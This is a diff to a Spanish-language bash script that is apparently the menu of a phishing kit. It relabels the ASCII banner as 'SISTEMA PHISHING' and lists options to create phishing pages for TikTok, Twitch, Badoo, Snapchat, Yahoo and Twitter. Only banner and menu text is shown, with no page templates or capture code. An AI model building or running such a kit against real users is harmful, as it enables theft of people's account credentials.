@@ -477,17 +477,8 @@ echo " 			             / ___|_ _/ ___|  _ \ / ___|              "
 echo " 			            | |    | | |   | |_) | |                  "
 echo " 			            | |___ | | |___|  __/| |___               "
 echo " 	  		             \____|___\____|_|    \____|            "
-echo "				        Unidad Ciberseguridad"
+echo "				   ------ SISTEMA PHISHING ------ "
 
-
-echo "   _____  _       _                             _____   _      _       _      _ "              
-echo "  / ____|(_)     | |                           |  __ \ | |    (_)     | |    (_) "             
-echo " | (___   _  ___ | |_   ___  _ __ ___    __ _  | |__) || |__   _  ___ | |__   _  _ __  " 
-echo "  \___ \ | |/ __|| __| / _ \| '_ ` _ \  / _` | |  ___/ | '_ \ | |/ __|| '_ \ | || '_ \ "
-echo "  ____) || |\__ \| |_ |  __/| | | | | || (_| | | |     | | | || |\__ \| | | || || | | |"
-echo " |_____/ |_||___/ \__| \___||_| |_| |_| \__,_| |_|     |_| |_||_||___/|_| |_||_||_| |_|"
-echo "                                                                                  __/ |"
-echo "                                                                                 |___/ "
 
 echo -e "----------------------------------------------------------------------------------------------------"
 
@@ -506,7 +497,7 @@ ${RED}[${WHITE}07${RED}]${ORANGE} Tiktok      <-------------------- Crear Phishi
 		${RED}[${WHITE}09${RED}]${ORANGE} Twitch      <-------------------- Crear Phishing Para Twitch 
 		${RED}[${WHITE}10${RED}]${ORANGE} Badoo       <-------------------- Crear Phishing Para Badoo 
 		${RED}[${WHITE}11${RED}]${ORANGE} Snapchat    <-------------------- Crear Phishing Para Snapchat 
-		${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	      <-------------------- Crear Phishing Para Yahoo 
+${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	      <-------------------- Crear Phishing Para Yahoo 
 		${RED}[${WHITE}13${RED}]${ORANGE} Twitter     <-------------------- Crear Phishing Para Twitter 
 		${RED}[${WHITE}00${RED}]${ORANGE} Salir
 
